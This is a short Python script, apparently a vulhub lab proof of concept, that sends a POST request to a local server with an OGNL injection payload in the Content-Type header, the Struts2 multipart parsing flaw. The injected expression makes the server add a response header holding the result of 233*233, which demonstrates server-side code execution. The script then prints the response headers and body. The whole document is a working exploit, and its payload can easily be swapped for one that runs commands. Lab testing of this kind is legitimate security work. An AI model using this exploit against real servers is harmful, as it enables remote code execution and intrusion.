import requests

# Target URL
url = "http://localhost:8080"

# Put a malicious OGNL expression into the Content-Type Header
payload = "%{(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233))}.multipart/form-data"

# Set the header
headers = {
    "Content-Type": payload
}

# Send request
response = requests.post(url, headers=headers, timeout=5)

# Print headers
for key, value in response.headers.items():
    print(f"{key}: {value}")

# Print a body
print(response.text)